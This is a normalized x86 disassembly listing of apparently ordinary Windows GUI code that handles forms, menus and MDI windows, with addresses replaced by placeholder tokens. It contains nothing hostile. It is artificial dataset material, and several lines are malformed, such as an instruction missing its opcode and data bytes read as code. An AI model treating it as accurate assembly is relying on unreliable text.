je r-xdata
sub_46f7c4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_46f841
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_46f84c
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4598e8
sub_46f878
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_4598e8
xor edx edx
jmp r-xdata
mov eax esi
call sub_46db04
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_46f8b0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_455250
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_4598e8
sub_46f8f4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_45535c
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_46f948
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_4528d8
sub_46f97c
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_4734ec
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_4734d8
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_46f9c8
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_4734ec
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4734d8
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_46fa18
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_418c68
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_46fa48
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_45c380
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_4734bc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_4734bc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_46fa18
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_4734bc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_4734a8
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_418dc4
call sub_4031ec
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_4734a8
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_4734a8
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_4734a8
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_46fb4c
push ebx
mov ebx eax
mov eax ebx
call sub_46fb44
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_42b8e8
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_46fb74
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_4598a0
mov dl 0x1
mov eax esi
call sub_46fed8
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_46ff54
mov edx eax
mov eax esi
call sub_455bec
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_459a3c
mov dl 0x1
mov eax esi
call sub_46eef8
sub_46fbf4
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_45c380
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_4661bc
mov edi eax
mov eax ebp
call sub_45c380
push eax
call DrawMenuBar
sub_46fc70
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_4213bc
xor edx edx
mov eax ebx
call sub_467b54
sub_46fc94
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_46fbf4
mov eax edx
mov edx ebx
call sub_4213bc
sub_46fcbc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46fe82
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_4734ec
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_469708
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4734d8
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_4213bc
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4734d8
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
call sub_4039b8
mov eax ebx
call sub_45c684
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_45c380
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_46fbf4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fe89
lea eax [ ebp - 0x10 ]
call sub_403f7c
retn
mov dl 0x1
mov eax ebx
call sub_470d80
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_45c380
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_45c380
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_45c380
mov edx eax
mov eax esi
call sub_469708
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_45c380
push eax
call SetMenu
sub_46fea4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46fe90
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_46ff00
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_46fef4
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_46ff6c
push ebx
mov ebx eax
mov eax ebx
call sub_45b960
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_46ff54
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_46ff54
mov edx eax
mov eax ebx
call sub_455bec
mov edx 0xff00000f
mov eax ebx
call sub_455bec
pop ebx
retn
sub_46fff0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_45c380
push eax
call ShowWindow
sub_470030
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_46fa48
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_46fa48
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_4734bc
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4734a8
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_46fa48
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4734a8
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4734bc
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_4734a8
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_4734a8
call sub_4731ac
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4734a8
call sub_473190
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4734a8
call sub_473178
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_4734a8
call sub_473178
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_4734a8
call sub_473178
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4734a8
call sub_4731c4
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_4734a8
call sub_4731ac
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4734a8
call sub_473190
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_4734a8
call sub_473178
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_4734a8
call sub_4731c4
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_4734a8
call sub_4731ac
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_4734a8
call sub_4731ac
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_4734a8
call sub_4731ac
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4734a8
call sub_473190
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4734a8
call sub_473178
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_4734a8
call sub_4731c4
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_4734a8
call sub_473178
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_4734a8
call sub_4731c4
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_4734a8
call sub_4731ac
push eax
mov edx esi
mov eax [ rw-data ]
call sub_4734a8
call sub_473190
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_470384
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_46d938
mov edx esi
mov eax edi
call sub_472d28
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_470433 ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_45916c
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_45916c
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax DefMDIChildProcA
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_470595
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_46d948
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_45c380
push eax
call SendMessageA
mov eax ebx
call sub_470ef4
push eax
push 0x1
push 0x80
mov eax ebx
call sub_45c380
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_455450
push eax
mov eax ebx
call sub_455494
push eax
mov eax ebx
call sub_45c380
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406cd8
mov [ ebx + 0x254 ] eax
push ebx
push sub_46f4e0
call sub_42237c
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_4661bc
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_45c380
push eax
call SetWindowPos
jmp r-xdata
sub_4706e2
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_47080d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_4594d0
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_472c00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470814
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_47081c
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_45973c
push 0x0
mov eax ebx
call sub_45c380
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_470860
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_459ec0
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_45c380
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_45c380
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_4708c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_47096c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470973
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
mov eax edi
call sub_46cc58
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_4033e8
mov eax ebx
call sub_470c7c
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_4033e8
test al al
jne r-xdata
sub_47097c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_458e24
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_458e24
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_4708c4
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_4709c4
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_4708c4
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_4709e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_418f60
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_418e40
mov eax edi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_418f60
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_418e40
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_470c58
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
